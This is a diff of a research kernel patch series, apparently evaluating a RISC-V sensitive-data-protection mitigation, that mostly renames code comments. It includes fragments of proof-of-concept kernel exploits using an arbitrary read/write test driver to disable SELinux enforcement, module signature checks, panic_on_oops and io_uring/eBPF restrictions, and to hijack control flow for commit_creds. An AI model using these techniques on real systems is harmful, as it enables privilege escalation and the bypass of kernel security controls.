++// SDP: Add a simple proof of concept that overwrites panic_on_oops from 1 to 0, allowing the system to continue running after an oops instead of panicking
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -5767,7 +5768,7 @@ index 000000000000..9eff830d2b32
 +    arb_read(arbrw_dev_fd, panic_on_oops_addr, &panic_on_oops_addr, sizeof(unsigned long));
 +    printf("[+] panic_on_oops address from kernel: 0x%lx\n", panic_on_oops_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // panic_on_oops_addr = panic_on_oops_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -5791,12 +5792,12 @@ index 000000000000..9eff830d2b32
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/poc_table.sh b/drivers/misc/arbrw/poc/poc_table.sh
 new file mode 100755
-index 000000000000..e1b14b93c72c
+index 000000000000..f11e4622477b
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/poc_table.sh
 @@ -0,0 +1,188 @@
 +#!/bin/bash
-+# FZY: The arbrw PoC table - the run command for every PoC, and the output each
++# SDP: The arbrw PoC table - the run command for every PoC, and the output each
 +# one produces when it works on the original, unprotected kernel. Both host
 +# drivers source this file rather than copying it: run_poc_ori_kernel.py turns
 +# the table into pass/fail checks, and run_poc_sdp_kernel.py rewrites the mode
@@ -5985,18 +5986,18 @@ index 000000000000..e1b14b93c72c
 +fi
 diff --git a/drivers/misc/arbrw/poc/ret_addr_poc.c b/drivers/misc/arbrw/poc/ret_addr_poc.c
 new file mode 100644
-index 000000000000..56da4bbe902b
+index 000000000000..294410c217c4
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/ret_addr_poc.c
 @@ -0,0 +1,73 @@
-+// FZY: Add a simple control-flow hijacking proof of concept that overwrites the return address to execute a commit_creds(&init_cred) gadget
++// SDP: Add a simple control-flow hijacking proof of concept that overwrites the return address to execute a commit_creds(&init_cred) gadget
 +#include <fcntl.h>
 +#include <stdio.h>
 +#include <stdlib.h>
 +#include <sys/ioctl.h>
 +#include <unistd.h>
 +
-+// FZY: Return-address overwrite. use_tagged: 0 = plain ld/sd (naive attacker),
++// Return-address overwrite. use_tagged: 0 = plain ld/sd (naive attacker),
 +// 3 = tagged ld_sdp/sd_sdp (attacker reaching for the tagged instructions). On an
 +// SDP kernel both trap (plain on STag, tagged on TTag mismatch) and fail.
 +struct arb_ret_overwrite_request {
@@ -6210,11 +6211,11 @@ index 000000000000..9dc6d690ff7e
 +EOF
 diff --git a/drivers/misc/arbrw/poc/selinux_state_poc.c b/drivers/misc/arbrw/poc/selinux_state_poc.c
 new file mode 100644
-index 000000000000..e6d3e17d2b60
+index 000000000000..7d82b6d17143
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/selinux_state_poc.c
 @@ -0,0 +1,221 @@
-+// FZY: Add a simple selinux bypass proof of concept that overwrites selinux_state.enforcing from 1 (enforcing mode) to 0 (permissive mode)
++// SDP: Add a simple selinux bypass proof of concept that overwrites selinux_state.enforcing from 1 (enforcing mode) to 0 (permissive mode)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -6418,7 +6419,7 @@ index 000000000000..e6d3e17d2b60
 +
 +    printf("[+] state_enforce address from kernel memory: 0x%lx\n", state_enforce_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // state_enforce_addr = state_enforce_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -6438,11 +6439,11 @@ index 000000000000..e6d3e17d2b60
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sig_enforce_poc.c b/drivers/misc/arbrw/poc/sig_enforce_poc.c
 new file mode 100644
-index 000000000000..a2ce2142e34a
+index 000000000000..a2836bbb306f
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sig_enforce_poc.c
 @@ -0,0 +1,186 @@
-+// FZY: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
++// SDP: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
 +
 +#include <fcntl.h>
 +#include <stdbool.h>
@@ -6605,7 +6606,7 @@ index 000000000000..a2ce2142e34a
 +    arb_read(arbrw_dev_fd, sig_enforce_addr, &sig_enforce_addr, sizeof(unsigned long));
 +    printf("[+] sig_enforce address from kernel: 0x%lx\n", sig_enforce_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sig_enforce_addr = sig_enforce_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -6631,11 +6632,11 @@ index 000000000000..a2ce2142e34a
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/softirq_action_poc.c b/drivers/misc/arbrw/poc/softirq_action_poc.c
 new file mode 100644
-index 000000000000..c1ab33782f58
+index 000000000000..a8a5217cdd51
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/softirq_action_poc.c
 @@ -0,0 +1,169 @@
-+// FZY: Control-flow hijacking proof of concept that overwrites the function pointer in softirq_vec (array of struct softirq_action) to redirect softirq handling to a wrapper gadget function
++// SDP: Control-flow hijacking proof of concept that overwrites the function pointer in softirq_vec (array of struct softirq_action) to redirect softirq handling to a wrapper gadget function
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -6807,11 +6808,11 @@ index 000000000000..c1ab33782f58
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c b/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c
 new file mode 100644
-index 000000000000..eb6a54972843
+index 000000000000..e6404c16e6cc
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c
 @@ -0,0 +1,214 @@
-+// FZY: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
++// SDP: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -7007,7 +7008,7 @@ index 000000000000..eb6a54972843
 +
 +    printf("[+] sysctl_io_uring_disabled address from kernel memory: 0x%lx\n", sysctl_io_uring_disabled_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sysctl_io_uring_disabled_addr = sysctl_io_uring_disabled_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -7028,11 +7029,11 @@ index 000000000000..eb6a54972843
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c b/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c
 new file mode 100644
-index 000000000000..07c036d4287c
+index 000000000000..06f8cc3772df
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c
 @@ -0,0 +1,211 @@
-+// FZY: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
++// SDP: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -7225,7 +7226,7 @@ index 000000000000..07c036d4287c
 +
 +    printf("[+] sysctl_unprivileged_bpf_disabled address from kernel memory: 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sysctl_unprivileged_bpf_disabled_addr = sysctl_unprivileged_bpf_disabled_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -7246,11 +7247,11 @@ index 000000000000..07c036d4287c
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/thread_poc.c b/drivers/misc/arbrw/poc/thread_poc.c
 new file mode 100644
-index 000000000000..11e4046666df
+index 000000000000..c3ffa6ad0f9f
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/thread_poc.c
 @@ -0,0 +1,198 @@
-+// FZY: Control-flow hijacking proof of concept that overwrites the saved ra register in task_struct.thread to redirect a sleeping thread's execution to a kernel function
++// SDP: Control-flow hijacking proof of concept that overwrites the saved ra register in task_struct.thread to redirect a sleeping thread's execution to a kernel function
 +//   1. Fork a child process
 +//   2. Child gets its own task_struct address via ioctl, reports it, then sleeps
 +//   3. Parent overwrites the child's thread_struct.ra with thread_hijack_target
@@ -7401,7 +7402,7 @@ index 000000000000..11e4046666df
 +           thread_offset, thread_ptr);
 +
 +    printf("[parent] SDP mode: thread pointer (tagged): 0x%lx\n", thread_ptr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // thread_ptr = thread_ptr | 0xFFFF000000000000;
 +
 +    ra_addr = thread_ptr;
@@ -7458,11 +7459,11 @@ index 000000000000..4fd86e2d62c4
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/test/sdp_cache_test.c b/drivers/misc/arbrw/test/sdp_cache_test.c
 new file mode 100644
-index 000000000000..e01a4555f4ac
+index 000000000000..3518cad53669
 --- /dev/null
 +++ b/drivers/misc/arbrw/test/sdp_cache_test.c
 @@ -0,0 +1,73 @@
-+// FZY: User space test for the sdp cache feature
++// SDP: User space test for the sdp cache feature
 +// Opens /dev/arb_rw and issues the ARB_SDP_CACHE_TEST ioctl, which:
 +//   1. Creates an sdp_cache with 64-byte objects at a randomized vmalloc address
 +//   2. Allocates two objects from the cache
@@ -7537,11 +7538,11 @@ index 000000000000..e01a4555f4ac
 +}
 diff --git a/drivers/misc/testmod/Kconfig b/drivers/misc/testmod/Kconfig
 new file mode 100644
-index 000000000000..4762bdaf4903
+index 000000000000..ae2ff5d2e360
 --- /dev/null
 +++ b/drivers/misc/testmod/Kconfig
 @@ -0,0 +1,7 @@
-+# FZY: Config for the simple test module
++# SDP: Config for the simple test module
 +config TEST_MODULE
 +	tristate "Hello World Module"
 +	help
@@ -7550,20 +7551,20 @@ index 000000000000..4762bdaf4903
 +	  If unsure, say N.
 diff --git a/drivers/misc/testmod/Makefile b/drivers/misc/testmod/Makefile
 new file mode 100644
-index 000000000000..5f874493267b
+index 000000000000..534732b99416
 --- /dev/null
 +++ b/drivers/misc/testmod/Makefile
 @@ -0,0 +1,2 @@
-+# FZY: Add the test module to Makefile
++# SDP: Add the test module to Makefile
 +obj-$(CONFIG_TEST_MODULE) += hello.o
 \ No newline at end of file
 diff --git a/drivers/misc/testmod/hello.c b/drivers/misc/testmod/hello.c
 new file mode 100644
-index 000000000000..5092099c2b52
+index 000000000000..e48c44631a9f
 --- /dev/null
 +++ b/drivers/misc/testmod/hello.c
 @@ -0,0 +1,20 @@
-+// FZY: A simple unsigned hello world module for testing sig_enforce bypass
++// SDP: A simple unsigned hello world module for testing sig_enforce bypass
 +#include <linux/module.h>
 +#include <linux/kernel.h>
 +#include <linux/init.h>
@@ -7585,7 +7586,7 @@ index 000000000000..5092099c2b52
 +module_exit(hello_exit);
 \ No newline at end of file
 diff --git a/drivers/tty/tty_io.c b/drivers/tty/tty_io.c
-index 8a94e5a43c6d..6eec050b805e 100644
+index 8a94e5a43c6d..6109de08e594 100644
 --- a/drivers/tty/tty_io.c
 +++ b/drivers/tty/tty_io.c
 @@ -1104,8 +1104,30 @@ static ssize_t file_tty_write(struct file *file, struct kiocb *iocb, struct iov_
@@ -7593,7 +7594,7 @@ index 8a94e5a43c6d..6eec050b805e 100644
   *	each device.
   */
 +
-+// FZY: User space init end marker
++// SDP: User space init end marker
 +#ifdef SDP_INSTCOUNT
 +#include <asm/csr.h>
 +static atomic_t sdp_login_marker_fired = ATOMIC_INIT(0);
@@ -7612,7 +7613,7 @@ index 8a94e5a43c6d..6eec050b805e 100644
 +
  static ssize_t tty_write(struct kiocb *iocb, struct iov_iter *from)
  {
-+// FZY: User space init end marker at user login prompt
++// SDP: User space init end marker at user login prompt
 +#ifdef SDP_INSTCOUNT
 +	sdp_maybe_fire_login_marker();
 +#endif
@@ -7620,14 +7621,14 @@ index 8a94e5a43c6d..6eec050b805e 100644
  }
  
 diff --git a/include/linux/genalloc.h b/include/linux/genalloc.h
-index 0bd581003cd5..c3cd18c5c345 100644
+index 0bd581003cd5..b946f86980d9 100644
 --- a/include/linux/genalloc.h
 +++ b/include/linux/genalloc.h
 @@ -209,6 +209,13 @@ extern struct gen_pool *gen_pool_get(struct device *dev, const char *name);
  extern bool gen_pool_has_addr(struct gen_pool *pool, unsigned long start,
  			size_t size);
  
-+// FZY: Expose these for use in sdp_cache
++// SDP: Expose these for use in sdp_cache
 +extern struct gen_pool_chunk *gen_pool_find_chunk(struct gen_pool *pool,
 +						  unsigned long addr);
 +extern void gen_pool_free_in_chunk(struct gen_pool *pool,
@@ -7639,11 +7640,11 @@ index 0bd581003cd5..c3cd18c5c345 100644
  	const char *propname, int index);
 diff --git a/include/linux/sdp_cache.h b/include/linux/sdp_cache.h
 new file mode 100644
-index 000000000000..28cf20db9669
+index 000000000000..b4d54158381d
 --- /dev/null
 +++ b/include/linux/sdp_cache.h
 @@ -0,0 +1,16 @@
-+// FZY: Header for the sdp cache, for random allocation of sensitive data
++// SDP: Header for the sdp cache, for random allocation of sensitive data
 +
 +#ifndef _LINUX_SDP_CACHE_H
 +#define _LINUX_SDP_CACHE_H
@@ -7658,7 +7659,7 @@ index 000000000000..28cf20db9669
 +void sdp_cache_free(struct sdp_cache *cache, void *ptr);
 +void sdp_cache_destroy(struct sdp_cache *cache);
 +
-+#endif /* _LINUX_SDP_CACHE_H */
++#endif // _LINUX_SDP_CACHE_H
 diff --git a/init/Kconfig b/init/Kconfig
 index 6d35728b94b2..c5ccd992e366 100644
 --- a/init/Kconfig
@@ -7672,14 +7673,14 @@ index 6d35728b94b2..c5ccd992e366 100644
  config IRQ_WORK
  	bool
 diff --git a/init/main.c b/init/main.c
-index 436d73261810..bfab18d024ee 100644
+index 436d73261810..308e622a2da6 100644
 --- a/init/main.c
 +++ b/init/main.c
 @@ -105,6 +105,10 @@
  #include <asm/setup.h>
  #include <asm/sections.h>
  #include <asm/cacheflush.h>
-+// FZY: csr_write()/CSR_MSDPC/SDP_ENABLE_CHECKS for the sdp code below
++// SDP: csr_write()/CSR_MSDPC/SDP_ENABLE_CHECKS for the sdp code below
 +#ifdef CONFIG_RISCV
 +#include <asm/csr.h>
 +#endif
@@ -7690,7 +7691,7 @@ index 436d73261810..bfab18d024ee 100644
  	char *command_line;
  	char *after_dashes;
  
-+// FZY: Kernel init start marker
++// SDP: Kernel init start marker
 +#ifdef SDP_INSTCOUNT
 +	csr_write(CSR_MSDPC, 0x10);
 +#endif
@@ -7702,12 +7703,12 @@ index 436d73261810..bfab18d024ee 100644
  
  	do_sysctl_args();
  
-+// FZY: Enable sdp checks at the end of kernel init
++// SDP: Enable sdp checks at the end of kernel init
 +#ifdef SDP_ENABLE_CHECKS
 +	arch_sdp_enable();
 +#endif
 +
-+// FZY: Kernel init end marker
++// SDP: Kernel init end marker
 +#ifdef SDP_INSTCOUNT
 +	csr_read_set(CSR_MSDPC, 0x20);
 +#endif
@@ -7715,7 +7716,7 @@ index 436d73261810..bfab18d024ee 100644
  	if (ramdisk_execute_command) {
  		ret = run_init_process(ramdisk_execute_command);
 +
-+// FZY: User space init start marker
++// SDP: User space init start marker
 +#ifdef SDP_INSTCOUNT
 +		if (!ret) {
 +			csr_read_set(CSR_MSDPC, 0x40);
@@ -7730,22 +7731,16 @@ index 436d73261810..bfab18d024ee 100644
  		       ramdisk_execute_command, ret);
  	}
 diff --git a/lib/genalloc.c b/lib/genalloc.c
-index 4fa5635bf81b..e258a92819e0 100644
+index 4fa5635bf81b..a38b06b12124 100644
 --- a/lib/genalloc.c
 +++ b/lib/genalloc.c
-@@ -519,6 +519,55 @@ void gen_pool_free_owner(struct gen_pool *pool, unsigned long addr, size_t size,
+@@ -519,6 +519,41 @@ void gen_pool_free_owner(struct gen_pool *pool, unsigned long addr, size_t size,
  }
  EXPORT_SYMBOL(gen_pool_free_owner);
  
-+// FZY: For sdp_cache implementation
-+/**
-+ * gen_pool_find_chunk - find the chunk containing a given address
-+ * @pool: the generic memory pool
-+ * @addr: address to look up
-+ *
-+ * Returns the chunk containing @addr, or NULL if not found.
-+ * Caller must hold rcu_read_lock().
-+ */
++// SDP: For sdp_cache implementation
++// gen_pool_find_chunk - find the chunk containing @addr, or NULL if none.
++// Caller must hold rcu_read_lock()
 +struct gen_pool_chunk *gen_pool_find_chunk(struct gen_pool *pool,
 +					  unsigned long addr)
 +{
@@ -7759,16 +7754,8 @@ index 4fa5635bf81b..e258a92819e0 100644
 +}
 +EXPORT_SYMBOL(gen_pool_find_chunk);
 +
-+/**
-+ * gen_pool_free_in_chunk - free memory back to pool given the chunk
-+ * @pool: pool to free to
-+ * @chunk: the chunk the memory belongs to (as returned by gen_pool_find_chunk)
-+ * @addr: starting address of memory to free
-+ * @size: size in bytes of memory to free
-+ *
-+ * Like gen_pool_free, but skips the chunk lookup since the caller already
-+ * knows which chunk the address belongs to.
-+ */
++// gen_pool_free_in_chunk - free [addr, addr+size) back to @pool using @chunk
++// (from gen_pool_find_chunk), skipping gen_pool_free's chunk lookup
 +void gen_pool_free_in_chunk(struct gen_pool *pool, struct gen_pool_chunk *chunk,
 +			 unsigned long addr, size_t size)
 +{
@@ -7790,14 +7777,14 @@ index 4fa5635bf81b..e258a92819e0 100644
   * gen_pool_for_each_chunk - call func for every chunk of generic memory pool
   * @pool:	the generic memory pool
 diff --git a/mm/Kconfig b/mm/Kconfig
-index 264a2df5ecf5..6a36cf74f980 100644
+index 264a2df5ecf5..8f28d03376c9 100644
 --- a/mm/Kconfig
 +++ b/mm/Kconfig
 @@ -1260,4 +1260,16 @@ config LOCK_MM_AND_FIND_VMA
  
  source "mm/damon/Kconfig"
  
-+# FZY: Kconfig for sdp cache, for random allocation of sensitive data
++# SDP: Kconfig for sdp cache, for random allocation of sensitive data
 +config SDP_CACHE
 +	bool "Sensitive Data Protection Cache"
 +	depends on RISCV && 64BIT
@@ -7811,7 +7798,7 @@ index 264a2df5ecf5..6a36cf74f980 100644
 +
  endmenu
 diff --git a/mm/Makefile b/mm/Makefile
-index ec65984e2ade..f9d9525d39d0 100644
+index ec65984e2ade..f9d114552039 100644
 --- a/mm/Makefile
 +++ b/mm/Makefile
 @@ -138,3 +138,6 @@ obj-$(CONFIG_IO_MAPPING) += io-mapping.o
@@ -7819,15 +7806,15 @@ index ec65984e2ade..f9d9525d39d0 100644
  obj-$(CONFIG_GENERIC_IOREMAP) += ioremap.o
  obj-$(CONFIG_SHRINKER_DEBUG) += shrinker_debug.o
 +
-+# FZY: Build sdp_cache.o
++# SDP: Build sdp_cache.o
 +obj-$(CONFIG_SDP_CACHE) += sdp_cache.o
 diff --git a/mm/sdp_cache.c b/mm/sdp_cache.c
 new file mode 100644
-index 000000000000..c14454d50dfc
+index 000000000000..e97f5ff8505d
 --- /dev/null
 +++ b/mm/sdp_cache.c
-@@ -0,0 +1,357 @@
-+// FZY: Implementation of the sdp cache, a random allocator for sensitive data in kernel. Each type of sensitive data has its own sdp_cache, which is randomly placed in the vmalloc/ioremap area backed by a gen_pool.
+@@ -0,0 +1,352 @@
++// SDP: Implementation of the sdp cache, a random allocator for sensitive data in kernel. Each type of sensitive data has its own sdp_cache, which is randomly placed in the vmalloc/ioremap area backed by a gen_pool
 +
 +#include <linux/bitmap.h>
 +#include <linux/genalloc.h>
@@ -8035,7 +8022,7 @@ index 000000000000..c14454d50dfc
 +  return addr;
 +}
 +
-+// FZY: set_tag1/0 on tripwire slots
++// set_tag1/0 on tripwire slots
 +static __always_inline void sdp_tripwire_set_tag(void *slot, u64 ttag, bool is_set)
 +{
 +#ifdef SDP_SD
@@ -8050,18 +8037,13 @@ index 000000000000..c14454d50dfc
 +#endif
 +}
 +
-+/*
-+ * Bit layout of a single prandom value (32 bits):
-+ *   [0..1]   - allocate tripwire? both set → yes (~1/4 probability)
-+ *   [2]      - tripwire placement (0 = before object, 1 = after)
-+ *   [3..18]  - 16-bit TTag value
-+ *   (other bits ignored)
-+ */
++// Bit layout of a prandom value: [0..1] allocate tripwire (both set, ~1/4),
++// [2] placement (0 before, 1 after object), [3..18] 16-bit TTag, rest ignored
 +#define SDP_RND_TRIPWIRE_MASK  3U
 +#define SDP_RND_PLACE_BIT      2
 +#define SDP_RND_TTAG_MASK    0xFFFFU
 +
-+// FZY: Derive a 16-bit tripwire TTag from the sdp_cache pointer with a simple xor-fold
++// Derive a 16-bit tripwire TTag from the sdp_cache pointer with a simple xor-fold
 +static __always_inline u64 sdp_cache_ttag(const struct sdp_cache *cache)
 +{
 +  unsigned long v = (unsigned long)cache;
@@ -8085,7 +8067,7 @@ index 000000000000..c14454d50dfc
 +    if (!addr)
 +      return NULL;
 +
-+    // FZY: Emulate the performance impact of set_tag
++    // Emulate the performance impact of set_tag
 +    memset((void *)addr, 0, obj_size);
 +    return (void *)addr;
 +  }
@@ -8152,7 +8134,7 @@ index 000000000000..c14454d50dfc
 +      tripwire = base;
 +    }
 +
-+    // FZY: Clear the tripwire slots with set_tag0
++    // Clear the tripwire slots with set_tag0
 +    for (size_t i = 0; i < obj_size / sizeof(u64); i++)
 +      sdp_tripwire_set_tag((char *)tripwire + i * sizeof(u64), ttag, 0);
 +
@@ -8162,7 +8144,7 @@ index 000000000000..c14454d50dfc
 +    free_size = obj_size;
 +  }
 +
-+  // FZY: Emulate the performance impact of clear_tag for the tripwire slot
++  // Emulate the performance impact of clear_tag for the tripwire slot
 +  // memset((void *)(base), 0, free_size);
 +
 +  gen_pool_free_in_chunk(cache->pool, chunk, base, free_size);
@@ -11682,36 +11664,23 @@ index 000000000000..84a27e70881e
 \ No newline at end of file
 diff --git a/static_instcount.py b/static_instcount.py
 new file mode 100755
-index 000000000000..1fd9dc7e42ae
+index 000000000000..cc7f69948aca
 --- /dev/null
 +++ b/static_instcount.py
-@@ -0,0 +1,276 @@
-+#!/usr/bin/env python3
-+# FZY: Static instruction counter for an SDP-extended RV64 kernel image.
-+#
-+# Mirrors the classification in contrib/plugins/sdp_counter.c so a static
-+# count of the kernel binary is directly comparable to a dynamic snapshot
-+# from the QEMU plugin.
-+#
-+# Categories (one column per):
-+#   all, normal_load, normal_store,
-+#   ld_scp, ld_sdp, sd_scp, sd_sdp,
-+#   set_tag0, set_tag1, clear_tag
-+#
-+# Input: an ELF kernel image (e.g. vmlinux). By default the script runs
-+# riscv64-linux-gnu-objdump -d and classifies every disassembled instruction
-+# by its raw bytes. Lines rendered as `.word` / `.byte` / `.short` / etc. are
-+# data (e.g. the EFI PE-COFF header in .head.text) and are skipped.
-+# `.insn 4, 0xHEX` lines — used by objdump for instructions it doesn't
-+# recognise, including all SDP custom encodings — are classified by their
-+# bytes via the same logic the sdp_counter plugin uses, so SDP opcodes get
-+# bucketed correctly without a patched binutils. With --bytes, the ELF's
-+# executable PT_LOAD segments are byte-scanned directly instead.
-+#
+@@ -0,0 +1,263 @@
++# SDP: Static instruction counter for an SDP-extended RV64 kernel image.
++# Mirrors the classification in contrib/plugins/sdp_counter.c, so a static count
++# is comparable to the plugin's dynamic snapshot.
++# Columns: all, normal_load, normal_store, ld_scp, ld_sdp, sd_scp, sd_sdp,
++# set_tag0, set_tag1, clear_tag.
++# Input: an ELF kernel image (e.g. vmlinux). By default it runs objdump -d and
++# classifies each instruction by its raw bytes; .word/.byte data lines are skipped
++# and `.insn 4, 0xHEX` SDP encodings are bucketed by the same logic as the plugin.
++# With --bytes it scans the executable PT_LOAD segments directly.
 +# Usage:
-+#   ./static_instcount.py vmlinux
-+#   ./static_instcount.py vmlinux --bytes              # force byte scan
-+#   ./static_instcount.py vmlinux --objdump=/path/to/riscv64-objdump
++#  ./static_instcount.py vmlinux
++#  ./static_instcount.py vmlinux --bytes
++#  ./static_instcount.py vmlinux --objdump=/path/to/riscv64-objdump
 +
 +import argparse
 +import re
@@ -11821,14 +11790,14 @@ index 000000000000..1fd9dc7e42ae
 +
 +DEFAULT_OBJDUMP = "riscv64-linux-gnu-objdump"
 +
-+# Mnemonics objdump uses when it considers the bytes to be data, not code.
++# Mnemonics objdump uses when it considers the bytes to be data, not code
 +DATA_DIRECTIVES = frozenset({
 +    ".word", ".byte", ".short", ".half", ".long", ".dword", ".quad",
 +    ".string", ".asciz", ".ascii", ".zero",
 +})
 +
 +# An objdump disassembly line: leading spaces, hex address, ':', whitespace,
-+# a single run of hex (4 or 8 chars for RV64 GC), then optional mnemonic+args.
++# a single run of hex (4 or 8 chars for RV64 GC), then optional mnemonic+args
 +OBJDUMP_LINE_RE = re.compile(
 +    r"^\s*([0-9a-f]+):\s+([0-9a-f]+)(?:\s+(\S.*))?\s*$"
 +)
